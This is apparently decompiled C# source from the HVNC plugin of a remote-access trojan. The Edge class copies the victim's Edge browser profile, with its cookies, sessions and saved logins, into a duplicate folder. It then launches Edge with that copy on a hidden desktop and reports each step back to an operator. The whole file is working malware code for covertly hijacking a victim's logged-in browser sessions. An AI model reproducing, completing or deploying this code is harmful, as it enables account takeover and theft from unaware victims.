using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp
{
	// Token: 0x0200000D RID: 13
	internal class Edge
	{
		// Token: 0x06000057 RID: 87 RVA: 0x00003B7C File Offset: 0x00001D7C
		public static void OpenEdgeBrowser()
		{
			HideDesktop.Load(Plugin.Helper.HVNCDesktop);
			try
			{
				bool flag = !File.Exists(Edge.FilenameEdge) && !File.Exists(Edge.FilenameEdgeX86);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("MicrosoftEdge: Not Installed!");
				}
				else
				{
					try
					{
						bool flag3 = !Directory.Exists(Edge.fileNameUserDataCopy);
						bool flag4 = flag3;
						if (flag4)
						{
							Plugin.Helper.SendMSG("MicrosoftEdge: CloneProfile..");
							Edge.PC.FileSystem.CopyDirectory(Edge.fileNameUserData, Edge.fileNameUserDataCopy);
							Plugin.Helper.SendMSG("MicrosoftEdge: CloneProfile Completed");
						}
					}
					catch
					{
						Debug.WriteLine("Error!");
					}
					Debug.WriteLine("Complete.///");
					new Thread(delegate()
					{
						Thread.Sleep(1000);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						Edge.Open();
					}).Start();
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("MicrosoftEdge: " + ex.Message);
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003C98 File Offset: 0x00001E98
		public static void Open()
		{
			try
			{
				string text = null;
				bool flag = File.Exists(Edge.FilenameEdge);
				if (flag)
				{
					text = Edge.FilenameEdge;
				}
				bool flag2 = File.Exists(Edge.FilenameEdgeX86);
				if (flag2)
				{
					text = Edge.FilenameEdgeX86;
				}
				bool flag3 = text == null;
				if (!flag3)
				{
					HideDesktop.CreateProcess(string.Concat(new string[]
					{
						"\"",
						text,
						"\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=",
						Edge.fileNameUserDataCopy,
						"\""
					}), Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("MicrosoftEdge: Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("MicrosoftEdge: " + ex.Message);
			}
		}

		// Token: 0x04000025 RID: 37
		private static readonly Computer PC = new Computer();

		// Token: 0x04000026 RID: 38
		private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data";

		// Token: 0x04000027 RID: 39
		private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\Edge Data";

		// Token: 0x04000028 RID: 40
		private static readonly string FilenameEdge = WDir.SystemDirectory + "Program Files\\Microsoft\\Edge\\Application\\msedge.exe";

		// Token: 0x04000029 RID: 41
		private static readonly string FilenameEdgeX86 = WDir.SystemDirectory + "Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
	}
}
